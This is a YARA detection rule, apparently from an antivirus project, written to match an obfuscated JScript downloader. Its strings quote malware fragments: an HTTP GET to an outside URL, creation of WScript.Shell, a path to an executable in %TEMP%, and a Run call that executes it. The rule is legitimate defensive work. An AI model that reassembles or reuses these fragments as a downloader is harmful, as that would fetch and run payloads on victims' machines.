rule sig_20160330_7b0d192cf1442721bdf93a5965dc8058 {
  meta:
    description = "datamaliciousorder - file 20160330_7b0d192cf1442721bdf93a5965dc8058.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "7d6a95d5e4c9c9c68a4073ad4425fb2aad2c0a22df275a9e37c00cab9e8d79d9"

  strings:
    $s1  = "_H1[_X](\"GET\", \"http://pro.monbento.com/n3iska\", false);" fullword ascii
    $s2  = "var _XS = function _O() {return WScript[_V0](\"WScript\"+\".Shell\");}(), _ZX = 11;" fullword ascii
    $s3  = "function _V(_FJ, _AY){_H = _H * 1; return _FJ - _AY;};" fullword ascii
    $s4  = "if (_H1[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _MZ(){return _GU + \"\";};" fullword ascii
    $s6  = "function _VW() {return _XS[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"oRgvNXNf0aV.ex\" + \"e\";};" fullword ascii
    $s7  = "function _D1(_PJ){_XS[\"Run\"](_PJ, _H, _H);};" fullword ascii
    $s8  = "function _Y() {return ((_R == true) && (_R == _P0)) ? 1 : _H;};" fullword ascii
    $s9  = "function _HZ()" fullword ascii
    $s10 = "function _I(){return _V0;};" fullword ascii
    $s11 = "return _V(_P, _J);" fullword ascii
    $s12 = "function _D0(){return 22;};" fullword ascii
    $s13 = "function _D(_L) {var _IS = (1, 2, 3, 4, 5, _L); return _IS;};" fullword ascii
    $s14 = "var _MU = new this[\"Date\"]();" fullword ascii
    $s15 = " while (_VX){" fullword ascii
    $s16 = "var _H0 = false;" fullword ascii
    $s17 = "_P0 = true; " fullword ascii
    $s18 = "var _P0 = false;" fullword ascii
    $s19 = "var _R = false;" fullword ascii
    $s20 = "_R = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}